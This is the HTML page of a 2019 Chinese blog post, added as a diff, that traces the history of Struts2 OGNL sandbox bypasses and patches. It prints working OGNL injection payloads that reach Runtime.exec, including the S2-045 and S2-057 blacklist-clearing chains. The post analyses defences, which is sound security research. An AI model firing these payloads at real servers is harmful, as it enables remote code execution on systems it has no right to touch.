@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="He1m4n6a的博客">
+    <meta name="keyword"  content="腾讯">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        OGNL攻防史 - He1m4n6a的博客 | He1m4n6a&#39;s Blog
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> 路漫漫其修远兮，吾将上下而求索。 </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/img/avatar.jpg" />
+        </div>
+        <div class="name">
+            <i>He1m4n6a</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>主页</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>标签</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archive">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>存档</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>关于</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>搜索</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#OGNL表达式"><span class="toc-text">OGNL表达式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#OGNL基本操作"><span class="toc-text">OGNL基本操作</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#OGNL历史"><span class="toc-text">OGNL历史</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">搜索</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i> 路漫漫其修远兮，吾将上下而求索。 </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        OGNL攻防史
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">发布于：<span>2019-02-13 00:09:58</span></span>
+        
+        <span class="attr">标签：/
+        
+        <a class="tag" href="/tags/#OGNL" title="OGNL">OGNL</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#Struts2" title="Struts2">Struts2</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前基础篇对struts2的框架做了介绍，本篇章将对struts2的原理做个简介。目前struts2已经被阿里巴巴等大厂弃用了，但是作为曾经风靡一时的框架，并且互联网上还有大量的struts2应用，是很有必要学习一番的。</p>
+<h1 id="OGNL表达式"><a href="#OGNL表达式" class="headerlink" title="OGNL表达式"></a>OGNL表达式</h1><p>OGNL（Object Graph Navigation Language）即对象图形导航语言，是一个开源的表达式引擎。使用OGNL，你可以通过某种表达式语法，存取Java对象树中的任意属性、调用Java对象树的方法、同时能够自动实现必要的类型转化。如果我们把表达式看做是一个带有语义的字符串，那么OGNL无疑成为了这个语义字符串与Java对象之间沟通的桥梁。我们可以轻松解决在数据流转过程中所遇到的各种问题。</p>
+<p>##OGNL三要素</p>
+<p><strong>Expression(表达式)：</strong></p>
+<p>Expression规定OGNL<strong>要做什么</strong>，其本质是一个带有语法含义的字符串,这个字符串将规定操作的类型和操作的内容。OGNL支持的语法非常强大，从对象属性、方法的访问到简单计算，甚至支持复杂的lambda表达式。</p>
+<p><strong>Root(根对象)：</strong></p>
+<p>OGNL的root对象可以理解为OGNL要操作的对象，表达式规定OGNL要干什么，root则指定对<strong>谁进行操作</strong>。OGNL的root对象实际上是一个java对象，是所有OGNL操作的实际载体。</p>
+<p><strong>Context(上下文)：</strong></p>
+<p>有了表达式和根对象，已经可以使用OGNL的基本功能了。例如，根据表达式对root对象进行getvalue、setvalue操作。不过事实上在OGNL内部，所有的操作都会在一个特定的数据环境中运行，这个数据环境就是OGNL的上下文。<strong>单说就是上下文将规定OGNL的操作在哪里进行。</strong>OGNL的上下文环境是一个MAP结构，定义为OgnlContext，root对象也会被添加到上下文环境中，作为一个特殊的变量进行处理。</p>
+<p>OGNL进行对象存取操作的API在Ognl.java文件中，分别是getValue、setValue两个方法。getValue通过传入的OGNL表达式，在给定的上下文环境中，从root对象里取值：</p>
+<p><img src="/images/a5/1.png" alt=""></p>
+<p>setValue通过传入的OGNL表达式，在给定的上下文环境中，往root对象里写值:</p>
+<p><img src="/images/a5/2.png" alt=""></p>
+<h2 id="OGNL基本操作"><a href="#OGNL基本操作" class="headerlink" title="OGNL基本操作"></a>OGNL基本操作</h2><ol>
+<li><p>支持对象方法调用，形式如：objName.methodName()；</p>
+</li>
+<li><p>支持类静态的方法调用和值访问，表达式的格式为 <strong>@[类全名（包括包路）]@[方法名 | 值名]</strong>，例如：</p>
+</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="meta">@java</span>.lang.String<span class="meta">@add</span>（ <span class="string">'11'</span> , <span class="string">'hahhaha'</span> ）</span></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>支持赋值操作和表达式串联，例如：</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">number=<span class="number">18</span>, price=<span class="number">100</span>,Total()；</span></pre></td></tr></table></figure>
+
+<p>那么返回1800；</p>
+<ol start="4">
+<li><p>访问OGNL上下文（OGNL context）其实就是Map （教室、老师、学生）和ActionContext，</p>
+<ul>
+<li><p>OgnlContext=根对象(1)+非根对象(N)</p>
+<ul>
+<li><p>老师：根对象 1</p>
+</li>
+<li><p>学生：非根对象 n</p>
+<p>非根对象要通过<strong>#key</strong>访问，根对象可以省略<strong>#key</strong></p>
+</li>
+</ul>
+</li>
+<li><p><strong>根对象和非根对象的概括</strong></p>
+<ul>
+<li>一个上下文中只有一个根对象</li>
+<li>取跟对象的值，只需要直接通过根对象属性即可</li>
+<li>非根对象取值必须通过指定的上下文容器中的<strong>#key</strong>属性去取。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<h1 id="OGNL历史"><a href="#OGNL历史" class="headerlink" title="OGNL历史"></a>OGNL历史</h1><p>OgnlContext中的_memberAccess与securityMemberAccess是同一个SecurityMemberAccess类的实例，而且内容相同，也就是说全局的OgnlUtil实例都共享着相同的设置。如果利用OgnlUtil更改了设置项（excludedClasses、excludedPackageNames、excludedPackageNamePatterns）则同样会更改_memberAccess中的值。</p>
+<p>以下图例左边都是较为新的版本，右边为老版本。</p>
+<p>##Struts 2.3.14.1版本前</p>
+<p>S2-012、S2-013、S3-014的出现促使了这次更新，可以说在跟新到2.3.14.1版本前，ognl的利用基本属于不设防状态，我们可以看一下这两个版本的diff，不难发现当时还没有出现黑名单这样的说法，而修复的关键在于SecurityMemberAccess：</p>
+<p><img src="/images/a5/3.png" alt=""></p>
+<p>左边是2.3.14.1的版本，右边是2.3.14的版本，不难看出在这之前可以通过ognl直接更改allowStaticMethodAccess=true，就可以执行后面的静态方法了，所以当时非常通用的一种poc是：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">(#_memberAccess[‘allowStaticMethodAccess’]=true).(@java.lang.Runtime@getRuntime().exec(‘calc’))</span></pre></td></tr></table></figure>
+
+<p>而在2.3.14.1版本后将allowStaticMethodAccess设置成<strong>final属性</strong>后，就不能显式更改了，这样的poc显然也失效了。</p>
+<p>##Struts 2.3.20版本前</p>
+<p>在2.3.14.1后虽然不能更改allowStaticMethodAccess了，但是还是可以通过_memberAccess使用类的构造函数，并且访问公共函数，所以可以看到当时有一种替代的poc：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">(#p=new java.lang.ProcessBuilder(‘xcalc’)).(#p.start())</span></pre></td></tr></table></figure>
+
+<p>直到2.3.20，这样的poc都可以直接使用。在2.3.20后，Struts2不仅仅引入了黑名单（excludedClasses, excludedPackageNames 和 excludedPackageNamePatterns），更加重要的是阻止了所有构造函数的使用，所以就不能使用ProcessBuilder这个payload了。</p>
+<p>##Struts 2.3.29版本前</p>
+<p>左为2.3.29版本，右边为2.3.28版本</p>
+<p><img src="/images/a5/4.png" alt=""></p>
+<p>从黑名单中可以看到禁止使用了ognl.MemberAccess和ognl.DefaultMemberAccess，而这两个对象其实就是2.3.20-2.3.28版本的通用绕过方法，具体的思路就是利用_memberAccess调用静态对象DefaultMemberAccess，然后用DefaultMemberAccess覆盖_memberAccess。那么为什么说这样就可以使用静态方法了呢？ 我们先来看一下可以在S2-032、S2-033、S2-037通用的poc：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec(‘xcalc’))</span></pre></td></tr></table></figure>
+
+<p>我们来看一下ognl.OgnlContext@DEFAULT_MEMBER_ACCESS：</p>
+<p><img src="https://p5.ssl.qhimg.com/t01ecfd1c68ebe3f988.jpg" alt=""></p>
+<p>看过上一节的都知道，在程序运行时在setOgnlUtil方法中将黑名单等数据赋给SecurityMemberAccess，而这就是创建_memberAccess的过程，在动态调试中，我们可以看到这两个对象的id甚至都是一样的，而SecurityAccess这个对象的父类本身就是ognl.DefaultMemberAccess，而其建立关系的过程就相当于继承父类并重写父类的过程，所以这里我们利用其父类DefaultMemberAccess覆盖_memberAccess中的内容，就相当于初始化了_memberAccess，这样就可以绕过其之前所设置的黑名单以及限制条件。</p>
+<p>##Struts 2.3.30+/2.5.2+</p>
+<p>到了2.3.30(2.5.2)之后的版本，我们可以使用的_memberAccess和DefaultMemberAccess都进入到黑名单中了，覆盖的方法看似就不行了，而这个时候S2-045的payload提供了一种新的思路：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">(#container=#context[‘com.opensymphony.xwork2.ActionContext.container’]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(‘xcalc’))</span></pre></td></tr></table></figure>
+
+<p>可以看到绕过的关键点在于：</p>
+<ul>
+<li>利用Ognl执行流程利用container获取了OgnlUtil实例</li>
+<li>清空了OgnlUtil$excludedClasses黑名单，释放了DefaultMemberAccess</li>
+<li>利用setMemberAccess覆盖</li>
+</ul>
+<p>而具体的流程可以参考2.2的内容。</p>
+<p>##Struts 2.5.16</p>
+<p>分析过S2-057后，你会发现ognl注入很容易复现，但是想要调用静态方法造成代码执行变得很难，我们来看一下Struts2又做了哪些改动：</p>
+<ul>
+<li><p>2.5.13版本后禁止访问coontext.map</p>
+</li>
+<li><p>准确来说是ognl包版本的区别，在2.5.13中利用的是3.1.15版本，在2.5.12版本中使用的是3.1.12版本：</p>
+</li>
+<li><p><img src="/images/a5/6.png" alt=""></p>
+</li>
+<li><p>而这个改变是在OgnlContext中：</p>
+</li>
+<li><p><img src="/images/a5/7.png" alt=""></p>
+</li>
+<li><p>不只是get方法，put和remove都没有办法访问了，所以说从根本上禁止了对context.map的访问。</p>
+</li>
+<li><p>2.5.20版本后excludedClasses不可变了，具体的代码在<a href="https://github.com/apache/struts/commit/748da3f8ce6b9f3953bc418745c35a534e5b98ca" target="_blank" rel="noopener">这里</a></p>
+</li>
+</ul>
+<p>所以在S2-045时可使用的payload已经没有办法再使用了，需要构造新的利用方式。</p>
+<p>文章提出了这么一种思路:</p>
+<ul>
+<li>没有办法使用context.map，可以调用attr，前文说过attr中保存着整个context的变量与方法，可以通过attr中的方法返回给我们一个context.map。</li>
+<li>没有办法直接调用excludedClasses，也就不能使用clear方法来清空，但是还可以利用setter来把excludedClasses给设置成空</li>
+<li>清空了黑名单，我们就可以利用DefaultMemberAccess来覆盖_memberAccess，来执行静态方法了。</li>
+</ul>
+<p>而这里又会出现一个问题，当我们使用OgnlUtil的setExcludedClasses和setExcludedPackageNames将黑名单置空时并非是对于源（全局的OgnlUtil）进行置空，也就是说_memberAccess是源数据的一个引用，就像前文所说的，在每次createAction时都是通过setOgnlUtil利用全局的源数据创建一个引用，这个引用就是一个MemberAccess对象，也就是_memberAccess。所以这里只会影响这次请求的OgnlUtil而并未重新创建一个新的_memberAccess对象，所以旧的_memberAccess对象仍未改变。</p>
+<p>而突破这种限制的方式就是再次发送一个请求，将上一次请求已经置空的OgnlUitl作为源重新创建一个_memberAccess，这样在第二次请求中_memberAccess就是黑名单被置空的情况，这个时候就释放了DefaultMemberAccess，就可以进行正常的覆盖以及执行静态方法。</p>
+<p>poc为：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">(#context=#attr[‘struts.valueStack’].context).(#container=#context[‘com.opensymphony.xwork2.ActionContext.container’]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(”)).(#ognlUtil.setExcludedPackageNames(”))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">(#context=#attr[‘struts.valueStack’].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(‘curl 127.0.0.1:9001’))</span></pre></td></tr></table></figure>
+
+
+
+<p>#现阶段的OGNL</p>
+<p>Struts2在 2.5.16版本后做了很多修改，截止到写文章的时候，已经更新到2.5.20，接下来我将把这几个版本的区别全部都列出来，并且说明现在绕过Ognl沙箱面临着哪些阻碍。同上一节，左边都为较新的版本，右边为较旧的版本。</p>
+<p>##2.5.17的改变（限制命名空间）</p>
+<ol>
+<li>黑名单的变动，禁止访问com.opensymphony.xwork2.ognl.</li>
+</ol>
+<ul>
+<li><img src="/images/a5/8.png" alt=""></li>
+<li>讲道理，2.5.17版本的修补真的是很暴力，直接在黑名单中加上了com.opensymphony.xwork2.ognl.也就是说我们根本没办法访问这个Struts2重写的ognl包了。</li>
+</ul>
+<ol>
+<li>切断了动态引用的方式，需要利用构造函数生成</li>
+</ol>
+<ul>
+<li><img src="/images/a5/9.png" alt=""></li>
+<li>不谈重写了setExcludedClasses和setExcludedPackageNamePatterns，单单黑名单的改进就极大的限制了利用。</li>
+</ul>
+<p>##2.5.19的改进</p>
+<ol>
+<li>ognl包的升级，从3.1.15升级到3.1.21</li>
+</ol>
+<ul>
+<li><img src="/images/a5/10.png" alt=""></li>
+</ul>
+<ol>
+<li>黑名单改进</li>
+</ol>
+<ul>
+<li><img src="/images/a5/11.png" alt=""></li>
+</ul>
+<ol>
+<li>在OgnlUtil中setXWorkConverter、setDevMode、setEnableExpressionCache、setEnableEvalExpression、setExcludedClasses、setExcludedPackageNamePatterns、setExcludedPackageNames、setContainer、setAllowStaticMethodAccess、setDisallowProxyMemberAccess都从public方法变成了protected方法了：</li>
+</ol>
+<ul>
+<li><img src="/images/a5/12.png" alt=""></li>
+<li><img src="/images/a5/13.png" alt=""></li>
+</ul>
+<p>也就是说没有办法显式调用setExcludedClasses、setExcludedPackageNamePatterns、setExcludedPackageNames了。</p>
+<p>##master分支的改变</p>
+<ol>
+<li>ognl包的升级，从3.1.21升级到3.2.10，直接删除了DefaultMemberAccess.java，同时删除了静态变量DEFAULT_MEMBER_ACCESS，并且_memberAccess变成了final：</li>
+</ol>
+<ul>
+<li><img src="/images/a5/14.png" alt=""></li>
+<li><img src="/images/a5/15.png" alt=""></li>
+</ul>
+<ol>
+<li>SecurityMemberAccess不再继承DefaultMemberAccess而直接转为MemberAccess接口的实现：</li>
+</ol>
+<ul>
+<li><img src="/images/a5/16.png" alt=""></li>
+</ul>
+<p>可以看到Struts2.5.*基本上是对Ognl的执行做出了重大的改变，DefaultAccess彻底退出了历史舞台意味着利用父类覆盖_memberAccess的利用方式已经无法使用，而黑名单对于com.opensymphony.xwork2.ognl的限制导致我们基本上没有办法利用Ognl本身的API来更改黑名单，同时_memberAccess变为final属性也使得S2-057的这种利用_memberAccess暂时性的特征而进行“重放攻击”的方式测地化为泡影。</p>
+<p>参考：</p>
+<p><a href="https://blog.csdn.net/pngyul/article/details/82723719" target="_blank" rel="noopener">https://blog.csdn.net/pngyul/article/details/82723719</a></p>
+<p><a href="https://www.anquanke.com/post/id/169735#h3-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/169735#h3-4</a></p>
+<p><a href="https://www.cnblogs.com/huangting/p/11105051.html" target="_blank" rel="noopener">https://www.cnblogs.com/huangting/p/11105051.html</a></p>
+
+        
+            <div class="donate-container">
+    <div class="donate-button">
+        <button id="donate-button">赞赏</button>
+    </div>
+    <div class="donate-img-container hide" id="donate-img-container">
+        <img id="donate-img" src="" data-src="/img/donate.jpg">
+        <p> 感谢鼓励 </p>
+    </div>
+</div>
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span>/</span>
+        
+        <span><a href="https://github.com/he1m4n6a" target="_blank" rel="noopener">github</a></span>
+        <span>/</span>
+        
+        <span><a href="https://weibo.com/u/1736968374" target="_blank" rel="noopener">weibo</a></span>
+        <span>/</span>
+        
+        <span><a href="#">wechat</a></span>
+        <span>/</span>
+        
+    </p>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud" target="_blank" rel="noopener">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+    <script>
+        /**
+         *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+         *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+        */
+        if( '' || '')
+        var disqus_config = function () {
+            this.page.url = '';  // Replace PAGE_URL with your page's canonical URL variable
+            this.page.identifier = ''; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        };
+
+        (function() { // DON'T EDIT BELOW THIS LINE
+            var d = document, s = d.createElement('script');
+            s.src = 'https://airclouds-blog.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+
+
+
+</html>
